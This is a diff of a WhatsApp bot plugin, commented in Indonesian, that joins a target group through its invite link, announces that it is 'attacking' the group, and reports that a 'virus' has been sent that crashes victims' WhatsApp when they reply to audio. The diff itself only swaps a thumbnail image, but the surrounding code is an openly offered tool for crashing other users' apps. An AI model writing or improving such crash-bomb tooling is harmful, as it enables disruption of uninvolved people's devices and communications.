@@ -11,7 +11,6 @@ let handler = async(m, { conn, text, usedPrefix, command }) => {
     if (!text) throw `Silahkan masukan link group target!\n\nContoh: ${usedPrefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstuvwxyz`;
     let [_, code] = text.match(linkRegex) || []
     if (!code) throw `Link salah cok!\ncontoh: ${usedPrefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstuvwxyz`;
-let wanz = 'https://telegra.ph/file/c080917609684bf229cd3.jpg'
         m.reply('Sedang Menyerang Group...');
         let target = await conn.groupAcceptInvite(code)
         let namagc = (await conn.groupMetadata(target)).subject || '';
@@ -27,7 +26,7 @@ let wanz = 'https://telegra.ph/file/c080917609684bf229cd3.jpg'
             console.error(e)
             throw conn.groupLeave(target)
         })
-        await conn.send2ButtonImg(m.chat, wanz, gcname, `*Sukses Mengirim ${command} Ke Group ${namagc}\n\n*NOTE*:Virus Ini Aktif Ketika Korban Mau Balas Audio,Maka Wangsafnya Akan Crash.\nhehe🗿\n\n${botdate}`,
+        await conn.send2ButtonImg(m.chat, await (await fetch(thumb)).buffer(), gcname, `*Sukses Mengirim ${command} Ke Group ${namagc}\n\n*NOTE*:Virus Ini Aktif Ketika Korban Mau Balas Audio,Maka Wangsafnya Akan Crash.\nhehe🗿\n\n${botdate}`,
    'Menu','.menu',
      'Owner','.owner'
        )
